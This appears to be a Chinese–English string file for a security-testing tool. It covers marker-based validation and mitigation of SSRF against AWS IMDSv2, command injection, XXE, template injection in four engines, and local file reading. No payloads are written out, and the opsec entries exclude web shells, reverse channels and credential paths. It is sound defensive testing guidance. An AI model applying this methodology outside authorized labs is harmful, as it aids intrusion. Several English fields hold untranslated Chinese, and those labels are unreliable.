exploitation.en: First request an owned HTTPS marker service to record fetcher identity, DNS, final IP, headers, redirects, and response propagation, then run one unique marker only against an isolated internal fixture. A positive result requires the same marker in both fixture and application egress logs; a timeout, status code, or accepted URL is insufficient.

mitigation.zh: 只允许业务必需的 http/https 目标与端口，规范化并解析后阻止回环、链路本地、私网和保留地址，固定连接 IP 与正确 Host/SNI，并在重定向后复检。禁止用户控制敏感请求头，通过网络策略限制元数据、数据库和管理网段。
mitigation.en: Allow only business-required http and https destinations and ports; canonicalize and resolve before blocking loopback, link-local, private, and reserved addresses; pin the connected IP with correct Host and SNI; and revalidate redirects. Prevent user control of sensitive headers and restrict metadata, database, and management networks with egress policy.

description.zh: 把唯一标记与解析器、代理、应用、数据库或浏览器证据按时间关联，并排除回显、缓存、重试、客户端修改和统一错误页。
description.en: Correlate the unique marker over time with parser, proxy, application, database, or browser evidence while excluding reflection, caching, retries, client modification, and generic error pages.

title.zh: 修复 AWS IMDSv2 SSRF 验证 并重放基线
title.en: Remediate AWS IMDSv2 SSRF Validation and Replay the Baseline

description.zh: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。
description.en: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。

overview.zh: AWS IMDSv2 SSRF 验证聚焦以下边界：在自有 EC2 实验实例中验证取回器是否能执行 IMDSv2 令牌流程，并只读取低敏感度实例字段。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: AWS IMDSv2 SSRF 验证聚焦以下边界：在自有 EC2 实验实例中验证取回器是否能执行 IMDSv2 令牌流程，并只读取低敏感度实例字段。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。
vulnerability.en: 风险来自用户可控 URL、scheme、主机、端口、请求头或重定向跨越服务端出站信任边界。校验必须基于规范化后解析地址和最终连接目标，并在每次 DNS 解析与重定向后重新执行，不能只检查原始字符串。

exploitation.zh: 先请求自有 HTTPS 标记服务记录取回器身份、DNS、最终 IP、请求头、重定向和响应传播，再只对隔离内部夹具运行一个唯一标记。阳性需要夹具日志与应用出站日志同时出现相同标记；超时、状态码或 URL 被接受均不足。
exploitation.en: First request an owned HTTPS marker service to record fetcher identity, DNS, final IP, headers, redirects, and response propagation, then run one unique marker only against an isolated internal fixture. A positive result requires the same marker in both fixture and application egress logs; a timeout, status code, or accepted URL is insufficient.

mitigation.zh: 只允许业务必需的 http/https 目标与端口，规范化并解析后阻止回环、链路本地、私网和保留地址，固定连接 IP 与正确 Host/SNI，并在重定向后复检。禁止用户控制敏感请求头，通过网络策略限制元数据、数据库和管理网段。
mitigation.en: Allow only business-required http and https destinations and ports; canonicalize and resolve before blocking loopback, link-local, private, and reserved addresses; pin the connected IP with correct Host and SNI; and revalidate redirects. Prevent user control of sensitive headers and restrict metadata, database, and management networks with egress policy.

title.en: Remediate OS Command Injection Harmless Marker and Replay the Baseline

description.zh: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。

overview.zh: 操作系统命令注入无害标记聚焦以下边界：使用 printf 固定标记证明参数到达命令解释器，不读取文件、不联网也不启动子任务。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: OS Command Injection Harmless Marker focuses on this boundary: Uses a fixed printf marker to prove that input reaches a command interpreter without reading files, using the network, or starting a secondary task. The review retains usable attack syntax and technical variants while adding version prerequisites, authorized-lab scope, normal baselines, detection evidence, and stop conditions; only confirmed incorrect samples are replaced.

vulnerability.zh: 风险来自不可信数据跨越字符串、模板、包含、反序列化或进程启动边界并被解释为代码、命令或运行时类型。确认必须区分输入回显、解析错误、可控计算、子进程创建和真正的权限影响。
vulnerability.en: Risk arises when untrusted data crosses a string, template, include, deserialization, or process-launch boundary and is interpreted as code, a command, or a runtime type. Confirmation must distinguish reflection, parser errors, controlled evaluation, child-process creation, and actual privilege impact.

exploitation.zh: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。
exploitation.en: 先用普通文本建立响应与日志基线，再执行只输出 PAYLOADER_RCE 固定标记或加载无副作用测试类型的样例。阳性必须由服务器端解释器、进程、类加载或模板日志与响应标记共同证明；不使用网络回连、敏感读取或持久化。

mitigation.zh: 移除动态执行和 shell 拼接，使用固定 API、参数数组、允许模板 ID 与安全反序列化类型；上传和日志目录不可执行，运行账户采用最小权限与隔离。记录异常子进程、类型加载、包含路径和解析错误，并用同一标记回归。
mitigation.en: Remove dynamic evaluation and shell concatenation; use fixed APIs, argument arrays, allowed template IDs, and safe deserialization types. Keep upload and log storage non-executable and run with least privilege and isolation. Audit anomalous child processes, type loading, include paths, and parser errors, then regress with the same marker.

description.zh: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。
description.en: 应用最小边界修复后重放正常、标记和阴性样例，确认业务路径仍可用、服务端证据消失且没有引入新的解析差异。

overview.zh: XML 外部实体 OAST 验证聚焦以下边界：使用自有 OAST 标记域确认解析器是否加载外部实体，不读取本地文件或云元数据。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。
overview.en: XML 外部实体 OAST 验证聚焦以下边界：使用自有 OAST 标记域确认解析器是否加载外部实体，不读取本地文件或云元数据。 审校保留原有可用攻击语法与技术变体，同时补充适用版本、授权实验范围、正常基线、检测证据和停止条件；只有已确认错误的样例才被替换。

vulnerability.zh: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。
vulnerability.en: 风险来自解析不可信 XML 时允许 DTD、外部通用实体、参数实体或外部资源加载。解析器、库版本和文档容器决定真实行为，文件读取、SSRF、带外请求与代码执行是不同能力，不能由一个错误消息互相推导。

exploitation.zh: 使用唯一 PAYLOADER_XXE 标记、自有 HTTPS 接收端或 XML 沙箱文件运行单个样例，同时保存原始 XML、解析器配置、应用日志和接收端时间戳。只有实体内容进入输出或对应出站请求被同一事务关联时才确认，DOCTYPE 被接受并不等于实体已展开。
exploitation.en: Run one sample with a unique PAYLOADER_XXE marker, an owned HTTPS receiver, or an XML sandbox file while preserving raw XML, parser configuration, application logs, and receiver timestamps. Confirm only when entity content reaches output or a matching outbound request correlates to the transaction; accepting a DOCTYPE does not prove entity expansion.

mitigation.zh: 在所有 XML、SVG、SOAP 和 OOXML 导入路径禁用 DTD、外部实体与外部资源，使用安全解析器预设并限制出站网络与文件权限。对压缩文档限制大小、部件数量和解压比，并在修复后重放正常文档、DOCTYPE 阴性样例和标记样例。
mitigation.en: Disable DTDs, external entities, and external resources across XML, SVG, SOAP, and OOXML import paths; use secure parser presets and restrict egress plus filesystem permissions. Limit archive size, part count, and expansion ratio, then replay a normal document, a DOCTYPE negative case, and the marker case after remediation.

overview.zh: Jinja SSTI 的核心边界是非可信文本是否被编译或解析为模板源码，而不是普通数据变量是否显示在页面。旧内容混合对象枚举、配置泄露、命令执行和反弹 Shell，现改为可重复的无副作用 marker，并按 Python/Jinja 实际语义验证。
overview.en: Jinja SSTI is defined by untrusted text being compiled or parsed as template source rather than ordinary data appearing through interpolation. The legacy content mixed object enumeration, configuration disclosure, command execution, and reverse shells; it is replaced with reproducible side-effect-free markers grounded in Python and Jinja semantics.

vulnerability.zh: 根因通常是应用把请求文本传给动态模板构造、字符串模板 API 或可编辑模板存储，而没有把它限制为 Context 数据。Jinja 表达式求值范围取决于普通 Environment、SandboxedEnvironment、已注册 Filter 和传入 Context；对象遍历能力必须由当前配置证明。 算术或字符串 marker 被稳定求值只能证明模板求值边界，不能直接证明文件读取或代码执行。
vulnerability.en: The root cause is usually request text reaching dynamic template construction, string-template AP Is, or editable template storage instead of remaining context data. Jinja evaluation depends on Environment versus Sandboxed Environment, registered filters, and supplied context, so object traversal must be proven for the current configuration. Stable arithmetic or string evaluation proves only the template-evaluation boundary, not file read or code execution.

exploitation.zh: 先提交普通文本建立字面输出基线，再逐项提交 Jinja 算术、字符串、变量、条件和集合 marker。每次只改变一个表达式并关联 request_id、模板名称和渲染结果；禁止访问环境变量、设置对象、文件、反射、进程或网络。
exploitation.en: Start with plain text as a literal-output baseline, then submit Jinja arithmetic, string, variable, conditional, and collection markers one at a time. Correlate request_id, template name, and rendered output without accessing environment variables, settings, files, reflection, processes, or network resources.

mitigation.zh: 使用固定、受版本控制的 Jinja 模板文件，把用户输入仅作为命名 Context 变量传入，并启用自动转义和引擎提供的安全配置。禁止运行时编译用户文本；审计自定义 Filter、Helper、对象包装和可编辑模板权限，并为 marker 添加回归测试。
mitigation.en: Use fixed, version-controlled Jinja template files and pass user input only as named context variables with autoescaping and available engine security settings. Do not compile user text at runtime; audit custom filters, helpers, object wrappers, editable-template permissions, and add marker regression tests.

overview.zh: Apache Velocity SSTI 的核心边界是非可信文本是否被编译或解析为模板源码，而不是普通数据变量是否显示在页面。旧内容混合对象枚举、配置泄露、命令执行和反弹 Shell，现改为可重复的无副作用 marker，并按 Java/Velocity 实际语义验证。
overview.en: Apache Velocity SSTI is defined by untrusted text being compiled or parsed as template source rather than ordinary data appearing through interpolation. The legacy content mixed object enumeration, configuration disclosure, command execution, and reverse shells; it is replaced with reproducible side-effect-free markers grounded in Java and Velocity semantics.

vulnerability.zh: 根因通常是应用把请求文本传给动态模板构造、字符串模板 API 或可编辑模板存储，而没有把它限制为 Context 数据。Velocity 可访问的对象和方法由 Context、Uberspector 与安全配置决定，ClassTool 或反射对象必须实际被应用暴露才能构成更高影响。 算术或字符串 marker 被稳定求值只能证明模板求值边界，不能直接证明文件读取或代码执行。
vulnerability.en: The root cause is usually request text reaching dynamic template construction, string-template AP Is, or editable template storage instead of remaining context data. Velocity object and method access depends on context, Uberspector, and security configuration, and higher impact requires actual exposure of Class Tool or reflective objects. Stable arithmetic or string evaluation proves only the template-evaluation boundary, not file read or code execution.

exploitation.zh: 先提交普通文本建立字面输出基线，再逐项提交 Velocity 算术、字符串、变量、条件和集合 marker。每次只改变一个表达式并关联 request_id、模板名称和渲染结果；禁止访问环境变量、设置对象、文件、反射、进程或网络。
exploitation.en: Start with plain text as a literal-output baseline, then submit Velocity arithmetic, string, variable, conditional, and collection markers one at a time. Correlate request_id, template name, and rendered output without accessing environment variables, settings, files, reflection, processes, or network resources.

mitigation.zh: 使用固定、受版本控制的 Velocity 模板文件，把用户输入仅作为命名 Context 变量传入，并启用自动转义和引擎提供的安全配置。禁止运行时编译用户文本；审计自定义 Filter、Helper、对象包装和可编辑模板权限，并为 marker 添加回归测试。
mitigation.en: Use fixed, version-controlled Velocity template files and pass user input only as named context variables with autoescaping and available engine security settings. Do not compile user text at runtime; audit custom filters, helpers, object wrappers, editable-template permissions, and add marker regression tests.

overview.zh: Mako SSTI 的核心边界是非可信文本是否被编译或解析为模板源码，而不是普通数据变量是否显示在页面。旧内容混合对象枚举、配置泄露、命令执行和反弹 Shell，现改为可重复的无副作用 marker，并按 Python/Mako 实际语义验证。
overview.en: Mako SSTI is defined by untrusted text being compiled or parsed as template source rather than ordinary data appearing through interpolation. The legacy content mixed object enumeration, configuration disclosure, command execution, and reverse shells; it is replaced with reproducible side-effect-free markers grounded in Python and Mako semantics.

vulnerability.zh: 根因通常是应用把请求文本传给动态模板构造、字符串模板 API 或可编辑模板存储，而没有把它限制为 Context 数据。Mako 模板可包含 Python 表达式和代码块，因此必须严格区分用户数据进入 Context 与用户文本被编译为模板源码。 算术或字符串 marker 被稳定求值只能证明模板求值边界，不能直接证明文件读取或代码执行。
vulnerability.en: The root cause is usually request text reaching dynamic template construction, string-template APIs, or editable template storage instead of remaining context data. Mako templates may contain Python expressions and code blocks, making it critical to distinguish user data passed in context from user text compiled as template source. Stable arithmetic or string evaluation proves only the template-evaluation boundary, not file read or code execution.

exploitation.zh: 先提交普通文本建立字面输出基线，再逐项提交 Mako 算术、字符串、变量、条件和集合 marker。每次只改变一个表达式并关联 request_id、模板名称和渲染结果；禁止访问环境变量、设置对象、文件、反射、进程或网络。
exploitation.en: Start with plain text as a literal-output baseline, then submit Mako arithmetic, string, variable, conditional, and collection markers one at a time. Correlate request_id, template name, and rendered output without accessing environment variables, settings, files, reflection, processes, or network resources.

mitigation.zh: 使用固定、受版本控制的 Mako 模板文件，把用户输入仅作为命名 Context 变量传入，并启用自动转义和引擎提供的安全配置。禁止运行时编译用户文本；审计自定义 Filter、Helper、对象包装和可编辑模板权限，并为 marker 添加回归测试。
mitigation.en: Use fixed, version-controlled Mako template files and pass user input only as named context variables with autoescaping and available engine security settings. Do not compile user text at runtime; audit custom filters, helpers, object wrappers, editable-template permissions, and add marker regression tests.

overview.zh: Django Template Language SSTI 的核心边界是非可信文本是否被编译或解析为模板源码，而不是普通数据变量是否显示在页面。旧内容混合对象枚举、配置泄露、命令执行和反弹 Shell，现改为可重复的无副作用 marker，并按 Python/Django 实际语义验证。
overview.en: Django Template Language SSTI is defined by untrusted text being compiled or parsed as template source rather than ordinary data appearing through interpolation. The legacy content mixed object enumeration, configuration disclosure, command execution, and reverse shells; it is replaced with reproducible side-effect-free markers grounded in Python and Django semantics.

vulnerability.zh: 根因通常是应用把请求文本传给动态模板构造、字符串模板 API 或可编辑模板存储，而没有把它限制为 Context 数据。Django 模板语言不支持任意 Python 表达式，算术验证必须使用内置 Filter 或 Tag，不能把 Jinja2 的乘法语法直接套用。 算术或字符串 marker 被稳定求值只能证明模板求值边界，不能直接证明文件读取或代码执行。
vulnerability.en: The root cause is usually request text reaching dynamic template construction, string-template APIs, or editable template storage instead of remaining context data. Django Template Language does not support arbitrary Python expressions, so arithmetic validation must use built-in filters or tags instead of copying Jinja2 multiplication syntax. Stable arithmetic or string evaluation proves only the template-evaluation boundary, not file read or code execution.

exploitation.zh: 先提交普通文本建立字面输出基线，再逐项提交 Django 算术、字符串、变量、条件和集合 marker。每次只改变一个表达式并关联 request_id、模板名称和渲染结果；禁止访问环境变量、设置对象、文件、反射、进程或网络。
exploitation.en: Start with plain text as a literal-output baseline, then submit Django arithmetic, string, variable, conditional, and collection markers one at a time. Correlate request_id, template name, and rendered output without accessing environment variables, settings, files, reflection, processes, or network resources.

mitigation.zh: 使用固定、受版本控制的 Django 模板文件，把用户输入仅作为命名 Context 变量传入，并启用自动转义和引擎提供的安全配置。禁止运行时编译用户文本；审计自定义 Filter、Helper、对象包装和可编辑模板权限，并为 marker 添加回归测试。
mitigation.en: Use fixed, version-controlled Django template files and pass user input only as named context variables with autoescaping and available engine security settings. Do not compile user text at runtime; audit custom filters, helpers, object wrappers, editable-template permissions, and add marker regression tests.

name.zh: 本地 Marker 文件读取边界

prerequisites.zh: 工作目录中存在随机只读 PAYLOADER_MARKER 夹具，并记录其规范路径与清理责任。

prerequisites.zh: 本地服务只监听 127.0.0.1，并可查看 URL 解码、最终路径、stream wrapper 和 include 结果日志。
prerequisites.en: The local service listens only on 127.0.0.1 and exposes URL-decoding, final-path, stream-wrapper, and include-result logs.

title.zh: 本地 Marker 文件读取边界验证请求

description.zh: 该请求只读取工作目录 PAYLOADER_MARKER，并要求结合最终路径或 wrapper 日志判断。
description.en: This request reads only the working-directory PAYLOADER_MARKER and must be evaluated with final-path or wrapper logs.

analysis.zh: 确认标准是响应精确返回工作目录 marker，且最终路径日志显示请求解析到该只读夹具。单独的 HTTP 200、PHP warning、空响应、WAF 告警或一次超时都不足以证明文件包含。
analysis.en: Confirmation requires that the response returns the exact working-directory marker and final-path logs show resolution to that read-only fixture. HTTP 200 alone, a PHP warning, an empty response, a WAF alert, or a single timeout does not prove file inclusion.

opsecTips.zh: 只使用工作目录 marker、localhost 与一次性请求 ID，禁止真实系统、凭据、环境和其他进程路径。
opsecTips.en: Use only working-directory markers, localhost, and one-time request IDs; prohibit real system, credential, environment, and other-process paths.

opsecTips.zh: 不提交可执行 PHP、WebShell、反向通道或序列化对象；每个请求设置三秒超时并在结束后清理夹具。
opsecTips.en: Do not submit executable PHP, web shells, reverse channels, or serialized objects; cap each request at three seconds and clean fixtures afterward.
